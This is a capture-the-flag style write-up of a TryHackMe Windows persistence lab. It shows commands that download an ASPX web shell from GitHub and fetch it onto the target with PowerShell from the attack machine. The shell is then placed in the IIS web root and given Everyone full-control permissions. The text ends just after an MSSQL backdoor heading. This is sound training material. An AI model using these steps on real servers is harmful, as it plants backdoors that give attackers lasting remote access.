# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/06/2023

# Using Web Shells
1. Started this room's machine
2. `wget <ASPX.NET WEB SHELL URL>`
```Bash
root@ip-10-10-105-255:~# wget https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
--2023-07-07 21:55:08--  https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20216 (20K) [text/plain]
Saving to: \u2018cmdasp.aspx\u2019

cmdasp.aspx       100%[==========>]  19.74K  --.-KB/s    in 0.03s   

2023-07-07 21:55:08 (767 KB/s) - \u2018cmdasp.aspx\u2019 saved [20216/20216]

```
3. `sudo python -m http.server`
```Bash
```
4. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<ASPX.NET WEB SHELL FILE1>','<ASPX.NET WEB SHELL FILE2>.exe')"`
```PowerShell
PS C:\Users\Administrator> PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.105.255:8000/cmdasp.aspx','shell.aspx')"
```
5. `dir`
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   9:00 PM          20216 shell.aspx
```
6. `move shell.aspx C:\inetpub\wwwroot\`
```PowerShell
```
7. `explorer.exe "http://10.10.26.163/shell.aspx"`
```PowerShell
```

![]()

8. `icacls <ASPX,WEB SHELL FILE PATH> /grant Everyone:F`
```PowerShell

```

9. `explorer.exe "http://10.10.26.163/shell.aspx"`
```PowerShell
```

![]()

10. `C:\flags\flag16.exe`
```PowerShell
```

# Using MSSQL as a Backdoor
1. Started this room's machine
